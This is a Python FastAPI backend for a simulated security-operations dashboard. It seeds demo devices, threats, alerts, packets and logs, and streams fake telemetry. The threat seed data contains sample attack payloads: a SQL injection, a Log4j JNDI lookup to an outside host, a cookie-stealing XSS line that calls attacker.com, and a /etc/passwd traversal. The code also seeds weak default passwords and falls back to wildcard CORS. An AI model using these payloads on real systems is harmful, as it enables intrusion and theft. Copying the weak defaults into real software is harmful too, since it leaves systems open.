import sys
from pathlib import Path

# Add project root and backend dir to sys.path so it can run from either cwd
_ROOT = Path(__file__).resolve().parent.parent.parent
_BACKEND = Path(__file__).resolve().parent.parent
for _p in [str(_ROOT), str(_BACKEND)]:
    if _p not in sys.path:
        sys.path.insert(0, _p)

import asyncio
import json
import random
from contextlib import asynccontextmanager
from datetime import datetime, timedelta

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware

from backend.app.config import PROJECT_NAME, CORS_ORIGINS

from backend.app.database import engine, Base, SessionLocal
from backend.app.models.user import User
from backend.app.models.device import Device
from backend.app.models.threat import Threat
from backend.app.models.firewall import FirewallRule
from backend.app.models.alert import Alert
from backend.app.models.packet import Packet
from backend.app.models.log import Log
from backend.app.security.auth import hash_password
from backend.app.websocket.manager import manager

from backend.app.routers import (
    auth,
    dashboard,
    devices,
    threats,
    alerts,
    firewall,
    packets,
    router,
    servers,
    reports,
    logs,
    settings
)

def seed_database():
    db = SessionLocal()
    try:
        # 1. Seed Users
        if db.query(User).count() == 0:
            users = [
                User(
                    name="Alex Vance",
                    email="alex.vance@securenet.ai",
                    role="Administrator",
                    avatar="AV",
                    hashed_password=hash_password("admin123")
                ),
                User(
                    name="Sarah Jenkins",
                    email="sarah.jenkins@securenet.ai",
                    role="Network Security Analyst",
                    avatar="SJ",
                    hashed_password=hash_password("analyst123")
                ),
                User(
                    name="Corporate Employee",
                    email="employee.vance@securenet.ai",
                    role="Employee",
                    avatar="CE",
                    hashed_password=hash_password("user123")
                ),
            ]
            db.add_all(users)
            db.commit()

        # 2. Seed Devices (8 Topology Nodes)
        if db.query(Device).count() == 0:
            devices_data = [
                Device(
                    node_id="internet",
                    name="WAN / External Internet",
                    ip="0.0.0.0/0",
                    type="WAN Gateway",
                    status="healthy",
                    mac="52:54:00:12:34:56",
                    vendor="Tier 1 Transit ISP",
                    model="BGP Gateway Core",
                    os="Carrier Grade BGP OS",
                    cpu_usage=14,
                    ram_usage=28,
                    throughput="10.2 Gbps",
                    interfaces=json.dumps([{"name": "wan0", "ip": "198.51.100.1/24", "status": "UP"}]),
                    ports=json.dumps([{"port": 179, "proto": "TCP", "service": "BGP"}]),
                    details=json.dumps({"asn": 64512, "peers": 4, "latency": "1.2ms"})
                ),
                Device(
                    node_id="firewall",
                    name="Perimeter Firewall HA",
                    ip="192.168.1.1",
                    type="NextGen Firewall",
                    status="warning",
                    mac="00:1B:17:00:01:01",
                    vendor="Palo Alto Networks",
                    model="PA-5250 Enterprise",
                    os="PAN-OS 11.0.2-h3",
                    cpu_usage=54,
                    ram_usage=68,
                    throughput="4.8 Gbps",
                    interfaces=json.dumps([
                        {"name": "eth0", "ip": "198.51.100.2", "alias": "WAN"},
                        {"name": "eth1", "ip": "192.168.1.1", "alias": "LAN"},
                        {"name": "eth2", "ip": "10.0.0.1", "alias": "DMZ"},
                        {"name": "eth3", "ip": "172.16.1.1", "alias": "HA Sync"}
                    ]),
                    ports=json.dumps([
                        {"port": 443, "proto": "TCP", "service": "Management Web UI"},
                        {"port": 22, "proto": "TCP", "service": "Admin SSH"}
                    ]),
                    details=json.dumps({"state": "Active/Passive HA Online", "rules_sync": 128, "active_sessions": 34820})
                ),
                Device(
                    node_id="router",
                    name="Core Gateway Router",
                    ip="192.168.1.254",
                    type="Layer 3 Router",
                    status="healthy",
                    mac="00:2A:6A:11:22:33",
                    vendor="Cisco Systems",
                    model="Catalyst 9500-48Y4C",
                    os="Cisco IOS XE 17.09.03a",
                    cpu_usage=28,
                    ram_usage=42,
                    throughput="18.4 Gbps",
                    interfaces=json.dumps([
                        {"name": "Te1/0/1", "ip": "192.168.1.254/24", "status": "UP"},
                        {"name": "Te1/0/2", "ip": "10.0.0.254/16", "status": "UP"}
                    ]),
                    ports=json.dumps([{"port": 22, "proto": "TCP", "service": "SSH"}]),
                    details=json.dumps({"routing_latency": "0.4ms", "mtu": 1500, "bgp_sync": True})
                ),
                Device(
                    node_id="switch",
                    name="Distribution Switch Fabric",
                    ip="192.168.1.2",
                    type="Managed Switch",
                    status="healthy",
                    mac="00:1C:73:A0:B1:C2",
                    vendor="Arista Networks",
                    model="7050SX3-48YC8",
                    os="EOS 4.30.1F",
                    cpu_usage=18,
                    ram_usage=32,
                    throughput="920 Mbps",
                    interfaces=json.dumps([
                        {"name": "Port 1-24", "speed": "10GbE", "status": "UP"},
                        {"name": "Uplink 49-52", "speed": "100GbE", "status": "UP"}
                    ]),
                    ports=json.dumps([{"port": 161, "proto": "UDP", "service": "SNMPv3"}]),
                    details=json.dumps({"active_ports": 20, "vlans": [10, 20, 30, 99]})
                ),
                Device(
                    node_id="db-server",
                    name="Primary PostgreSQL Host",
                    ip="192.168.1.50",
                    type="Database Server",
                    status="critical",
                    mac="00:50:56:A1:B2:C3",
                    vendor="Dell EMC PowerEdge",
                    model="R750xs Dual Xeon",
                    os="Ubuntu 22.04 LTS (PostgreSQL 15)",
                    cpu_usage=89,
                    ram_usage=92,
                    throughput="410 Mbps",
                    interfaces=json.dumps([{"name": "ens192", "ip": "192.168.1.50/24", "status": "UP"}]),
                    ports=json.dumps([
                        {"port": 5432, "proto": "TCP", "service": "PostgreSQL"},
                        {"port": 22, "proto": "TCP", "service": "SSH"}
                    ]),
                    details=json.dumps({"alert": "SQL Injection & High Query Execution Spikes", "max_conn": 500, "current_conn": 482})
                ),
                Device(
                    node_id="app-server",
                    name="Enterprise App Cluster",
                    ip="192.168.1.60",
                    type="Application Server",
                    status="healthy",
                    mac="00:50:56:B2:C3:D4",
                    vendor="HPE ProLiant",
                    model="DL380 Gen10",
                    os="Debian 12 (K8s Worker Node 04)",
                    cpu_usage=34,
                    ram_usage=58,
                    throughput="680 Mbps",
                    interfaces=json.dumps([{"name": "ens224", "ip": "192.168.1.60/24", "status": "UP"}]),
                    ports=json.dumps([
                        {"port": 443, "proto": "TCP", "service": "HTTPS Nginx"},
                        {"port": 80, "proto": "TCP", "service": "HTTP"},
                        {"port": 8000, "proto": "TCP", "service": "FastAPI Core"}
                    ]),
                    details=json.dumps({"uptime": "99.99%", "pods": 14, "cluster": "k8s-prod-cluster-01"})
                ),
                Device(
                    node_id="ids",
                    name="Suricata NIDS Sensor Node",
                    ip="192.168.1.100",
                    type="Security Sensor",
                    status="healthy",
                    mac="00:0C:29:14:25:36",
                    vendor="Custom Appliance",
                    model="SOC NIDS Engine 1U",
                    os="Alpine Linux 3.19 (Suricata 7.0)",
                    cpu_usage=22,
                    ram_usage=44,
                    throughput="1.8 Gbps",
                    interfaces=json.dumps([
                        {"name": "eth0", "ip": "192.168.1.100/24", "alias": "MGMT"},
                        {"name": "mon0", "ip": "0.0.0.0", "alias": "SPAN / Mirror Port"}
                    ]),
                    ports=json.dumps([{"port": 9000, "proto": "TCP", "service": "EveBox UI"}]),
                    details=json.dumps({"active_rules": 38400, "drops": 0, "pkts_analyzed": 1482910})
                ),
                Device(
                    node_id="pcs",
                    name="Corporate Workstation Subnet",
                    ip="192.168.1.100 - 192.168.1.200",
                    type="Client Subnet",
                    status="warning",
                    mac="Multiple",
                    vendor="Enterprise Clients",
                    model="VLAN 10 Corporate Workstations",
                    os="Windows 11 / macOS Sonoma",
                    cpu_usage=48,
                    ram_usage=62,
                    throughput="340 Mbps",
                    interfaces=json.dumps([{"name": "vlan10", "subnet": "192.168.1.0/24", "status": "UP"}]),
                    ports=json.dumps([{"port": 445, "proto": "TCP", "service": "SMB"}, {"port": 53, "proto": "UDP", "service": "DNS"}]),
                    details=json.dumps({"active_endpoints": 94, "anomalous_outbound": True})
                )
            ]
            db.add_all(devices_data)
            db.commit()

        # 3. Seed Threats (14 Threats: 2 Active, 12 Resolved)
        if db.query(Threat).count() == 0:
            now = datetime.utcnow()
            threats_data = [
                Threat(
                    ticket_id="TRT-2026-8801",
                    severity="Critical",
                    attack_vector="SQL Injection (UNION SELECT Exfiltration)",
                    source_ip="185.220.101.45",
                    destination_host="192.168.1.50 (db-server)",
                    status="Active",
                    raw_payload="GET /api/v1/users?id=1' UNION SELECT username, password_hash FROM admin_users-- HTTP/1.1\nHost: db.securenet.corp\nUser-Agent: sqlmap/1.7.2#stable",
                    timestamp=now - timedelta(minutes=4)
                ),
                Threat(
                    ticket_id="TRT-2026-8802",
                    severity="Critical",
                    attack_vector="DNS Amplification DDoS (12.4 Gbps Flood)",
                    source_ip="45.142.214.12",
                    destination_host="192.168.1.254 (router)",
                    status="Active",
                    raw_payload="DNS IN ANY isc.org +edns=0 +bufsize=4096 (12.4 Gbps reflection flood across 14,000 requests/sec)",
                    timestamp=now - timedelta(minutes=18)
                ),
                Threat(
                    ticket_id="TRT-2026-8798",
                    severity="High",
                    attack_vector="SSH Brute Force Authentication Attack",
                    source_ip="192.168.1.142",
                    destination_host="192.168.1.60 (app-server)",
                    status="Investigating",
                    raw_payload="SSH-2.0-OpenSSH_8.9p1 invalid user root; repeated 42 attempts/sec from internal workstation subnet",
                    timestamp=now - timedelta(hours=1, minutes=10)
                ),
                Threat(
                    ticket_id="TRT-2026-8780",
                    severity="Medium",
                    attack_vector="Stealth SYN Port Scanning (Nmap Probe)",
                    source_ip="103.251.170.8",
                    destination_host="192.168.1.1 (firewall)",
                    status="Resolved",
                    raw_payload="TCP [SYN] Seq=0 Win=1024 Len=0 MSS=1460 SACK_PERM TSval=19488 TSecr=0\nProbe target ports: 1-1024",
                    timestamp=now - timedelta(hours=3, minutes=20),
                    action_taken="Blocked Source IP on Perimeter Firewall",
                    admin_notes="Source subnet added to automatic threat blackhole list.",
                    resolved_by="Alex Vance",
                    resolved_at=now - timedelta(hours=3, minutes=15)
                ),
                # 10 historical resolved threats
                Threat(
                    ticket_id="TRT-2026-8772",
                    severity="High",
                    attack_vector="Log4j JNDI Remote Code Execution Probe",
                    source_ip="194.26.29.112",
                    destination_host="192.168.1.60 (app-server)",
                    status="Resolved",
                    raw_payload="${jndi:ldap://194.26.29.112:1389/Exploit}",
                    timestamp=now - timedelta(hours=6),
                    action_taken="Blocked Source IP on Perimeter Firewall",
                    admin_notes="Mitigated by WAF rule #101.",
                    resolved_by="Sarah Jenkins",
                    resolved_at=now - timedelta(hours=5, minutes=50)
                ),
                Threat(
                    ticket_id="TRT-2026-8765",
                    severity="Low",
                    attack_vector="ICMP Echo Flood Diagnostic Scan",
                    source_ip="89.208.103.24",
                    destination_host="192.168.1.254 (router)",
                    status="Resolved",
                    raw_payload="ICMP echo request, id 0x1f2e, seq 1, length 64",
                    timestamp=now - timedelta(hours=8),
                    action_taken="Rate Limited ICMP traffic",
                    admin_notes="Normal automated network test probe.",
                    resolved_by="Alex Vance",
                    resolved_at=now - timedelta(hours=7, minutes=55)
                ),
                Threat(
                    ticket_id="TRT-2026-8758",
                    severity="Medium",
                    attack_vector="Cross-Site Scripting (XSS In Polyglot)",
                    source_ip="195.154.255.7",
                    destination_host="192.168.1.60 (app-server)",
                    status="Resolved",
                    raw_payload="<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>",
                    timestamp=now - timedelta(hours=11),
                    action_taken="Terminated Active Suspicious TCP Session",
                    admin_notes="XSS sanitized at reverse proxy layer.",
                    resolved_by="Sarah Jenkins",
                    resolved_at=now - timedelta(hours=10, minutes=45)
                ),
                Threat(
                    ticket_id="TRT-2026-8749",
                    severity="Low",
                    attack_vector="SSL/TLS Weak Cipher Negotiation Attempt",
                    source_ip="185.191.171.14",
                    destination_host="192.168.1.60 (app-server)",
                    status="Resolved",
                    raw_payload="ClientHello TLS 1.0 Cipher: TLS_RSA_WITH_3DES_EDE_CBC_SHA",
                    timestamp=now - timedelta(hours=14),
                    action_taken="Enforced TLS 1.3 Strict Policy",
                    admin_notes="Deprecated cipher suites rejected by default.",
                    resolved_by="Alex Vance",
                    resolved_at=now - timedelta(hours=13, minutes=50)
                ),
                Threat(
                    ticket_id="TRT-2026-8738",
                    severity="High",
                    attack_vector="SMB Lateral Movement Probe (EternalBlue Heuristic)",
                    source_ip="192.168.1.188",
                    destination_host="192.168.1.50 (db-server)",
                    status="Resolved",
                    raw_payload="SMB2 Trans2 Negotiate Protocol Request (Anomalous dialect probe)",
                    timestamp=now - timedelta(hours=18),
                    action_taken="Isolated Target Endpoint Machine",
                    admin_notes="Endpoint VLAN quarantined; antivirus scan cleared.",
                    resolved_by="Sarah Jenkins",
                    resolved_at=now - timedelta(hours=17, minutes=30)
                ),
                Threat(
                    ticket_id="TRT-2026-8725",
                    severity="Medium",
                    attack_vector="DNS Tunneling Data Exfiltration",
                    source_ip="192.168.1.105",
                    destination_host="198.51.100.1 (WAN)",
                    status="Resolved",
                    raw_payload="TXT query: a8f9c1b72e8174.tunnel.c2server.net",
                    timestamp=now - timedelta(hours=22),
                    action_taken="Blocked Source IP on Perimeter Firewall",
                    admin_notes="C2 domain sinkholed in internal resolver.",
                    resolved_by="Alex Vance",
                    resolved_at=now - timedelta(hours=21, minutes=40)
                ),
                Threat(
                    ticket_id="TRT-2026-8712",
                    severity="Low",
                    attack_vector="SNMP Community String Guessing (Public)",
                    source_ip="77.88.55.66",
                    destination_host="192.168.1.2 (switch)",
                    status="Resolved",
                    raw_payload="SNMPv1 GetRequest community='public' oid=1.3.6.1.2.1.1.1.0",
                    timestamp=now - timedelta(days=1, hours=2),
                    action_taken="Blocked Source IP on Perimeter Firewall",
                    admin_notes="External SNMP disabled.",
                    resolved_by="Sarah Jenkins",
                    resolved_at=now - timedelta(days=1, hours=1)
                ),
                Threat(
                    ticket_id="TRT-2026-8701",
                    severity="Medium",
                    attack_vector="FTP Anonymous Login Scan",
                    source_ip="46.101.12.80",
                    destination_host="192.168.1.60 (app-server)",
                    status="Resolved",
                    raw_payload="USER anonymous PASS guest@securenet.ai",
                    timestamp=now - timedelta(days=1, hours=6),
                    action_taken="Terminated Active Suspicious TCP Session",
                    admin_notes="Port 21 closed.",
                    resolved_by="Alex Vance",
                    resolved_at=now - timedelta(days=1, hours=5)
                ),
                Threat(
                    ticket_id="TRT-2026-8690",
                    severity="High",
                    attack_vector="Directory Traversal (/etc/passwd Access)",
                    source_ip="212.102.40.19",
                    destination_host="192.168.1.60 (app-server)",
                    status="Resolved",
                    raw_payload="GET /public/download?file=../../../../etc/passwd HTTP/1.1",
                    timestamp=now - timedelta(days=1, hours=12),
                    action_taken="Blocked Source IP on Perimeter Firewall",
                    admin_notes="Input validation patch applied in app container.",
                    resolved_by="Sarah Jenkins",
                    resolved_at=now - timedelta(days=1, hours=11)
                ),
                Threat(
                    ticket_id="TRT-2026-8680",
                    severity="Low",
                    attack_vector="NTP Monlist Amplification Probe",
                    source_ip="91.240.118.15",
                    destination_host="192.168.1.254 (router)",
                    status="Resolved",
                    raw_payload="NTP v2 monlist request mode 7",
                    timestamp=now - timedelta(days=1, hours=18),
                    action_taken="Terminated Active Suspicious TCP Session",
                    admin_notes="NTP monlist disabled router-wide.",
                    resolved_by="Alex Vance",
                    resolved_at=now - timedelta(days=1, hours=17)
                )
            ]
            db.add_all(threats_data)
            db.commit()

        # 4. Seed Firewall Rules
        if db.query(FirewallRule).count() == 0:
            rules_data = [
                FirewallRule(
                    rule_number=101,
                    name="Block-Malicious-Blackhole",
                    direction="Inbound",
                    source_subnet="185.220.101.0/24",
                    dest_subnet="Any",
                    protocol="ALL",
                    action="DROP",
                    hits=14820,
                    is_active=True
                ),
                FirewallRule(
                    rule_number=102,
                    name="Allow-HTTPS-Public",
                    direction="Inbound",
                    source_subnet="Any",
                    dest_subnet="192.168.1.60",
                    protocol="TCP (443)",
                    action="ACCEPT",
                    hits=984120,
                    is_active=True
                ),
                FirewallRule(
                    rule_number=103,
                    name="Allow-SSH-Admin-VLAN",
                    direction="Inbound",
                    source_subnet="192.168.1.0/24",
                    dest_subnet="192.168.1.50",
                    protocol="TCP (22)",
                    action="ACCEPT",
                    hits=4120,
                    is_active=True
                ),
                FirewallRule(
                    rule_number=104,
                    name="Block-Outbound-Cryptomining",
                    direction="Outbound",
                    source_subnet="192.168.1.0/24",
                    dest_subnet="Any",
                    protocol="TCP (3333/4444/9999)",
                    action="DROP",
                    hits=890,
                    is_active=True
                )
            ]
            db.add_all(rules_data)
            db.commit()

        # 5. Seed Alerts
        if db.query(Alert).count() == 0:
            now = datetime.utcnow()
            alerts_data = [
                Alert(
                    alert_id="ALT-9901",
                    title="Critical SQL Injection Signature Triggered",
                    severity="critical",
                    description="Suricata SID: 2010992 - UNION SELECT pattern detected against Primary Database host.",
                    asset="db-server (192.168.1.50)",
                    timestamp=now - timedelta(minutes=4),
                    is_acknowledged=False
                ),
                Alert(
                    alert_id="ALT-9902",
                    title="High Inbound UDP Volume on Gateway",
                    severity="critical",
                    description="Traffic spike exceeding 12 Gbps threshold on Cisco Catalyst interface Te1/0/1.",
                    asset="router (192.168.1.254)",
                    timestamp=now - timedelta(minutes=18),
                    is_acknowledged=False
                ),
                Alert(
                    alert_id="ALT-9903",
                    title="Repeated SSH Authentication Failures",
                    severity="warning",
                    description="Workstation IP 192.168.1.142 initiated 42 failed auth attempts against App Server.",
                    asset="app-server (192.168.1.60)",
                    timestamp=now - timedelta(hours=1, minutes=10),
                    is_acknowledged=False
                ),
                Alert(
                    alert_id="ALT-9904",
                    title="NIDS Rule Definition Database Updated",
                    severity="info",
                    description="Suricata engine updated with 240 new emerging threat signatures (total: 38,400).",
                    asset="ids (192.168.1.100)",
                    timestamp=now - timedelta(hours=2),
                    is_acknowledged=True
                )
            ]
            db.add_all(alerts_data)
            db.commit()

        # 6. Seed Packets
        if db.query(Packet).count() == 0:
            packets_data = [
                Packet(
                    frame_id=1482910,
                    timestamp="18:55:01.214",
                    src_ip="185.220.101.45",
                    src_port=51240,
                    dst_ip="192.168.1.50",
                    dst_port=5432,
                    protocol="TCP",
                    length=1420,
                    status="BLOCKED",
                    flags="[PSH, ACK]",
                    payload_hex="47 45 54 20 2f 61 70 69 2f 76 31 2f 75 73 65 72 73 3f 69 64 3d 31 27 20 55 4e 49 4f 4e 20 53 45 4c 45 43 54 20 75 73 65 72 6e 61 6d 65 2c 20 70 61 73 73 77 6f 72 64 5f 68 61 73 68 20 46 52 4f 4d 20 61 64 6d 69 6e 5f 75 73 65 72 73 2d 2d",
                    payload_ascii="GET /api/v1/users?id=1' UNION SELECT username, password_hash FROM admin_users--"
                ),
                Packet(
                    frame_id=1482909,
                    timestamp="18:55:00.892",
                    src_ip="45.142.214.12",
                    src_port=53,
                    dst_ip="192.168.1.254",
                    dst_port=53,
                    protocol="UDP",
                    length=4096,
                    status="RATE_LIMITED",
                    flags="[DNS-ANY]",
                    payload_hex="00 01 81 80 00 01 00 0e 00 04 00 04 03 69 73 63 03 6f 72 67 00 00 ff 00 01",
                    payload_ascii="...isc.org..ANY reflection payload flood [4096 bytes]"
                ),
                Packet(
                    frame_id=1482908,
                    timestamp="18:54:59.102",
                    src_ip="192.168.1.142",
                    src_port=44812,
                    dst_ip="192.168.1.60",
                    dst_port=22,
                    protocol="TCP",
                    length=104,
                    status="PASSED",
                    flags="[SYN]",
                    payload_hex="53 53 48 2d 32 2e 30 2d 4f 70 65 6e 53 53 48 5f 38 2e 39 70 31 20 55 62 75 6e 74 75",
                    payload_ascii="SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
                ),
                Packet(
                    frame_id=1482907,
                    timestamp="18:54:58.441",
                    src_ip="192.168.1.60",
                    src_port=443,
                    dst_ip="198.51.100.88",
                    dst_port=59124,
                    protocol="HTTP/S",
                    length=1280,
                    status="PASSED",
                    flags="[ACK]",
                    payload_hex="17 03 03 04 e0 00 00 00 00 00 00 00 01 3a 4f 8c 91 2b 7e",
                    payload_ascii="TLSv1.3 Application Data [Encrypted Session]"
                ),
                Packet(
                    frame_id=1482906,
                    timestamp="18:54:57.900",
                    src_ip="103.251.170.8",
                    src_port=61099,
                    dst_ip="192.168.1.1",
                    dst_port=80,
                    protocol="TCP",
                    length=64,
                    status="BLOCKED",
                    flags="[SYN]",
                    payload_hex="00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00 00 3c",
                    payload_ascii="TCP Stealth Probe [Nmap SYN Scan]"
                )
            ]
            db.add_all(packets_data)
            db.commit()

        # 7. Seed Logs
        if db.query(Log).count() == 0:
            now_str = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            logs_data = [
                Log(
                    timestamp=now_str,
                    level="CRITICAL",
                    device="ids",
                    component="Suricata-NIDS",
                    message="Alert SID:2010992 - ET EXPLOIT PostgreSQL SQL Injection UNION SELECT attack detected.",
                    raw_json='{"sid": 2010992, "src": "185.220.101.45", "dst": "192.168.1.50", "category": "Web Application Attack"}'
                ),
                Log(
                    timestamp=now_str,
                    level="WARNING",
                    device="firewall",
                    component="PAN-OS-Session",
                    message="High connection rate on interface eth1: 42 connections/sec from 192.168.1.142.",
                    raw_json='{"device": "PA-5250", "event": "RateLimitWarning", "threshold": 30}'
                ),
                Log(
                    timestamp=now_str,
                    level="INFO",
                    device="router",
                    component="BGP-Core",
                    message="BGP Neighbor 198.51.100.1 state changed to ESTABLISHED. Prefixes received: 842,910.",
                    raw_json='{"neighbor": "198.51.100.1", "state": "ESTABLISHED", "as": 64512}'
                ),
                Log(
                    timestamp=now_str,
                    level="INFO",
                    device="app-server",
                    component="Nginx-Gateway",
                    message="SSL Handshake successful TLSv1.3 TLS_AES_256_GCM_SHA384 client 198.51.100.88.",
                    raw_json='{"protocol": "TLSv1.3", "cipher": "TLS_AES_256_GCM_SHA384", "status": 200}'
                )
            ]
            db.add_all(logs_data)
            db.commit()

    finally:
        db.close()

# Background WebSocket Telemetry Loop
async def telemetry_stream_worker():
    base_packets = 1482910
    while True:
        try:
            await asyncio.sleep(2.0)
            base_packets += random.randint(120, 280)
            pps = random.randint(13800, 14950)
            bandwidth = round(random.uniform(820.0, 860.0), 1)

            message = {
                "type": "TELEMETRY_UPDATE",
                "timestamp": datetime.utcnow().isoformat(),
                "data": {
                    "packetsCaptured": base_packets,
                    "ppsCurrent": pps,
                    "throughputMbps": bandwidth,
                    "activeConnections": random.randint(34500, 35200)
                }
            }
            await manager.broadcast_json(message)
        except asyncio.CancelledError:
            break
        except Exception:
            pass

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Initialize DB tables
    Base.metadata.create_all(bind=engine)
    # Seed initial data
    seed_database()
    # Start live telemetry simulation background task
    stream_task = asyncio.create_task(telemetry_stream_worker())
    yield
    stream_task.cancel()

app = FastAPI(
    title="SecureNetAI - Enterprise SOC API",
    description="Network Intrusion Detection System & SOC Backend Engine",
    version="4.2.0",
    lifespan=lifespan
)

# CORS Setup
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS if CORS_ORIGINS else ["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount Routers
app.include_router(auth.router)
app.include_router(dashboard.router)
app.include_router(devices.router)
app.include_router(threats.router)
app.include_router(alerts.router)
app.include_router(firewall.router)
app.include_router(packets.router)
app.include_router(router.router)
app.include_router(servers.router)
app.include_router(reports.router)
app.include_router(logs.router)
app.include_router(settings.router)

# Live WebSocket Stream Endpoint
@app.websocket("/api/v1/stream")
async def websocket_stream(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        # Send initial handshake message
        await websocket.send_text(json.dumps({
            "type": "STREAM_CONNECTED",
            "message": "Connected to SecureNetAI NIDS live sensor stream (v4.2)",
            "timestamp": datetime.utcnow().isoformat()
        }))
        while True:
            data = await websocket.receive_text()
            # Echo or handle ping
            if data == "ping":
                await websocket.send_text(json.dumps({"type": "PONG", "timestamp": datetime.utcnow().isoformat()}))
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

@app.get("/")
def root():
    return {
        "system": PROJECT_NAME,
        "version": "4.2.0",
        "status": "OPERATIONAL",
        "docs_url": "/docs",
        "timestamp": datetime.utcnow().isoformat()
    }
